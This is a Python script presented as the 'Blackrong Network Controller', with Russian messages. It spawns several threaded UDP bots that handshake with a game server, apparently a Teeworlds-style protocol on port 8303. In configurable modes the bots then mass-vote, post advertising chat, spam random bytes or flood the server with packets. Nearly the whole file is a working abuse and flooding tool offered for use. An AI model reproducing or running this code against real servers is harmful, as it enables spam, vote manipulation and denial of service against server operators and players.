
import os
import sys
import json
import socket
import random
import threading
import time
from colorama import Fore, Style, init

init(autoreset=True)

CONFIG_FILE = "blackrong_config.json"
BANNER = f"""
{Fore.CYAN}
▓█████▄  ▄▄▄       ██▀███   ██ ▄█▀ ██▓ ██▓    
▒██▀ ██▌▒████▄    ▓██ ▒ ██▒ ██▄█▒ ▓██▒▓██▒    
░██   █▌▒██  ▀█▄  ▓██ ░▄█ ▒▓███▄░ ▒██▒▒██░    
░▓█▄   ▌░██▄▄▄▄██ ▒██▀▀█▄  ▓██ █▄ ░██░▒██░    
░▒████▓  ▓█   ▓██▒░██▓ ▒██▒▒██▒ █▄░██░░██████▒
 ▒▒▓  ▒  ▒▒   ▓▒█░░ ▒▓ ░▒▓░▒ ▒▒ ▓▒░▓  ░ ▒░▓  ░
 ░ ▒  ▒   ▒   ▒▒ ░  ░▒ ░ ▒░░ ░▒ ▒░ ▒ ░░ ░ ▒  ░
 ░ ░  ░   ░   ▒     ░░   ░ ░ ░░ ░  ▒ ░  ░ ░   
   ░          ░  ░   ░     ░  ░    ░      ░  ░
 ░              {Fore.YELLOW}Network Controller v7.0{Fore.CYAN}
 {Fore.MAGENTA}При поддержке @black0re0
{Style.RESET_ALL}
"""

class BlackrongProtocol:
    PACKET_TYPES = {
        'CONNECT': b'\x00',
        'ACCEPT': b'\x01',
        'VOTE': b'\x03',
        'CHAT': b'\x04',
        'KEEPALIVE': b'\x0f'
    }

    @staticmethod
    def create_packet(packet_type, payload=b''):
        return b'\x00\x00\x00\x00' + packet_type + payload

class BlackrongBot:
    def __init__(self, config, bot_id):
        self.server = (config['server_ip'], config['server_port'])
        self.bot_id = bot_id
        self.mode = config['mode']
        self.running = True
        self.sock = None
        self.token = None
        self.client_id = random.getrandbits(32)
        self.retries = 0
        self.sequence = 0

    def connect(self):
        while self.running and self.retries < 15:
            try:
                self._handshake()
                self._main_loop()
            except Exception as e:
                print(f"{Fore.RED}Бот {self.bot_id} ошибка: {str(e)}")
                self.retries += 1
                time.sleep(min(30, 2 ** self.retries))
            finally:
                if self.sock: self.sock.close()

    def _handshake(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.settimeout(10)
        
        # Step 1: Connect
        self.sock.sendto(BlackrongProtocol.create_packet(
            BlackrongProtocol.PACKET_TYPES['CONNECT']), self.server)
        
        # Step 2: Accept
        response = self.sock.recv(1024)
        if len(response) < 12: raise ConnectionError("Invalid response")
        self.token = response[4:8]
        
        # Step 3: Confirm
        ack_packet = BlackrongProtocol.create_packet(
            BlackrongProtocol.PACKET_TYPES['ACCEPT'],
            self.token + response[8:12] + self.client_id.to_bytes(4, 'big'))
        self.sock.sendto(ack_packet, self.server)
        
        # Final confirmation
        if self.sock.recv(1024)[0] != 0x01:
            raise ConnectionError("Connection rejected")

        print(f"{Fore.GREEN}Бот {self.bot_id} подключен!")

    def _main_loop(self):
        while self.running:
            try:
                self._perform_action()
                time.sleep(random.uniform(0.5, 1.5))
                self._handle_network()
            except Exception as e:
                raise RuntimeError(str(e))

    def _perform_action(self):
        actions = {
            'vote': lambda: self.sock.sendto(
                BlackrongProtocol.create_packet(
                    BlackrongProtocol.PACKET_TYPES['VOTE'],
                    self.token + b'\x01\x00\x00\x00'), self.server),
            'message': lambda: self.sock.sendto(
                BlackrongProtocol.create_packet(
                    BlackrongProtocol.PACKET_TYPES['CHAT'],
                    self.token + f"[Bot {self.bot_id}] @black0re0".encode().ljust(64, b'\x00')), self.server),
            'spam': lambda: self.sock.sendto(
                BlackrongProtocol.create_packet(
                    BlackrongProtocol.PACKET_TYPES['CHAT'],
                    self.token + os.urandom(64)), self.server),
            'flood': lambda: [self.sock.sendto(
                BlackrongProtocol.create_packet(
                    BlackrongProtocol.PACKET_TYPES['CHAT'],
                    self.token + os.urandom(64)) for _ in range(5)]
        }
        actions.get(self.mode, lambda: None)()

    def _handle_network(self):
        try:
            data = self.sock.recv(1024)
            if data and data[0] == 0x0f:
                self.sock.sendto(data, self.server)
        except socket.timeout:
            pass

    def stop(self):
        self.running = False

def load_config():
    default = {
        'server_ip': '127.0.0.1',
        'server_port': 8303,
        'mode': 'message',
        'bot_count': 5,
        'max_retries': 10,
        'cooldown': 1.0
    }
    try:
        with open(CONFIG_FILE) as f:
            return {**default, **json.load(f)}
    except:
        with open(CONFIG_FILE, 'w') as f:
            json.dump(default, f, indent=4)
        return default

def main():
    print(BANNER)
    config = load_config()
    
    bots = []
    try:
        for i in range(config['bot_count']):
            bot = BlackrongBot(config, i+1)
            thread = threading.Thread(target=bot.connect, daemon=True)
            bots.append((bot, thread))
            thread.start()
            time.sleep(config['cooldown'])
        
        input("\nНажмите Enter для остановки...")
    finally:
        for bot, thread in bots:
            bot.stop()
            thread.join(timeout=1)
        print(f"{Fore.GREEN}Остановлено!")

if __name__ == "__main__":
    main()